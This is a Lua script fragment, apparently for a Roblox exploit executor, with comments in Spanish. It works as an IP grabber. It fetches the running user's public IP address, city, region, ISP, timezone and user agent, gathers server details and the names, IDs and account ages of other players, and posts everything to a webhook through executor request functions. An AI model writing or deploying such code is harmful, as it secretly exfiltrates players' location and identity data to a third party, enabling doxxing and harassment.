-- Función para obtener información de IP
local function GetIpData()
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    
    if success then
        local data = HttpService:JSONDecode(result)
        return {
            ip = data.query or "N/A",
            country = data.country or "N/A",
            city = data.city or "N/A",
            region = data.regionName or "N/A",
            isp = data.isp or "N/A",
            timezone = data.timezone or "N/A"
        }
    end
    
    return {
        ip = "Error",
        country = "Error",
        city = "Error"
    }
end

-- Función para obtener información del juego
local function GetGameInfo()
    local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    return {
        gameName = placeInfo.Name,
        gameId = game.GameId,
        placeId = game.PlaceId,
        creator = placeInfo.Creator.Name,
        serverId = game.JobId,
        playerCount = #Players:GetPlayers(),
        maxPlayers = Players.MaxPlayers
    }
end

-- Función para obtener información del sistema
local function GetSystemInfo()
    local success, result = pcall(function()
        return game:HttpGet("https://httpbin.org/user-agent")
    end)
    
    if success then
        local data = HttpService:JSONDecode(result)
        return {
            userAgent = data["user-agent"] or "N/A"
        }
    end
    
    return {
        userAgent = "N/A"
    }
end

-- Función para capturar información de otros jugadores
local function GetPlayersInfo()
    local playersInfo = {}
    
    for _, plr in ipairs(Players:GetPlayers()) do
        table.insert(playersInfo, {
            name = plr.Name,
            userId = plr.UserId,
            displayName = plr.DisplayName,
            accountAge = plr.AccountAge,
            isFriend = plr:IsFriendsWith(player.UserId),
            ping = plr:GetAttribute("Ping") or "N/A"
        })
    end
    
    return playersInfo
end

-- Función para enviar datos al webhook
local function SendData(data)
    local req = request or http_request or (syn and syn.request)
    
    if req then
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        
        return true
    end
    
    return false
end

